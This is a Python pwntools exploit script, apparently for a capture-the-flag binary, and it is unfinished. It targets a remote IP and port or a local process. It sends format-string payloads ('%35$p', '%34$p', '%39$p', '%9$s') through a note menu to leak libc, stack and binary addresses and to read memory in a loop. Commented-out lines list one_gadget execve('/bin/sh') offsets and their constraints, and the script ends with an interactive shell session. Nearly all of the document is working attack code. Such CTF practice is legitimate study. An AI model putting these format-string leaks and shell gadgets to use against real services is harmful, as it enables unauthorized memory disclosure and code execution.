#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('vuln_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('212.2.248.184', 31950)
else:
    p = process([exe.path])
GDB()

def note(load):
    slna(b'3. Exit\n', 1)
    sa(b'Log a note:\n', load)

note(b'%35$p\n')
libc_leak = int(p.recvline()[:-1], 16)
# info(f'libc leak: {hex(libc_leak)}')
print(f'libc leak: {hex(libc_leak)}')

libc.address = libc_leak - 0x2a1ca
print(f'libc base: {hex(libc.address)}')

note(b'%34$p\n')
stack_leak = int(p.recvline()[:-1], 16)
print(f'stack leak: {hex(stack_leak)}')

note(b'%39$p\n')
binary_leak = int(p.recvline()[:-1], 16)
print(f'binary leak: {hex(binary_leak)}')
binary_base = binary_leak -0x1314-0xdb
print(f'binary base: {hex(binary_base)}')

# pop_rdi = 


def secret(load):
    slna(b'3. Exit\n', 2)
    sa(b'Enter your secret info:\n', load)
secret(b'c'*60)

def loop(value_1, value_2):
    print(f'enter loop')
    for i in range(value_1, value_2+1, 8):
        load = flat(
            b'%9$s'.ljust(8, b'-'),
            i,
        )
        note(load +b'\n')
        output = p.recvline()
        print(f'{hex(i)}: {output}')

saved_rip = stack_leak - 0x98
info(f'saved rip: {hex(saved_rip)}')

loop(binary_base+0x4000, binary_base+0x4200)
load = flat(
    b'%9$s'.ljust(8, b'a'),
    # stack_leak - 0x98,
    binary_base

)
# log( load + b'\n')

# option 2: 64 num
# load = flat(
#     b'a'*64 + b'/bin/sh'
# )

# secret( b'\0' + b'a'*67)

# secret()

# 0x583dc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rax == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0x583e3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, rip+0x17302e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp

# log(b'a'*0x80)


p.interactive()
